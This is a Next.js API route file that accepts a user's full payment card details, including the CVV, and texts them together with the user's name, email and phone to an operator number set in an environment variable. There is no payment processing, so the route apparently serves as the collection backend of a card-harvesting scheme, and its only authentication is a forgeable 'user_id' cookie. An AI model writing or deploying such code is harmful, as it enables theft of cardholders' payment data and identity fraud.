// app/api/cards/request-sms/route.js
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getDb } from "../../../../lib/db";
import { sendCardDetailsSms } from "../../../../lib/sms";

async function assertAuth() {
  const cookieStore = await cookies();
  const userId = cookieStore.get("user_id")?.value;
  if (!userId) return null;
  return userId;
}

export async function POST(req) {
  const userId = await assertAuth();
  if (!userId) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const body = await req.json().catch(() => null);
  if (!body) {
    return NextResponse.json({ error: "Invalid body" }, { status: 400 });
  }

  const { locale, cardNumber, expiryDate, cvv, cardholderName } = body;

  if (!cardNumber || !expiryDate || !cvv || !cardholderName) {
    return NextResponse.json(
      { error: "Missing card fields" },
      { status: 400 }
    );
  }

  const db = await getDb();

  try {
    const [users] = await db.execute(
      `SELECT full_name AS fullName, email, phone FROM users WHERE id = ? LIMIT 1`,
      [userId]
    );
    const user = users[0] || {};

    const adminPhone = process.env.ADMIN_PHONE || null;
    if (!adminPhone) {
      await db.end();
      return NextResponse.json(
        { error: "ADMIN_PHONE not configured" },
        { status: 500 }
      );
    }

    await sendCardDetailsSms({
      to: adminPhone,
      user: { ...user, id: userId },
      locale,
      card: { cardNumber, expiryDate, cvv, cardholderName },
    });

    await db.end();

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("request-sms error:", err);
    await db.end();
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}
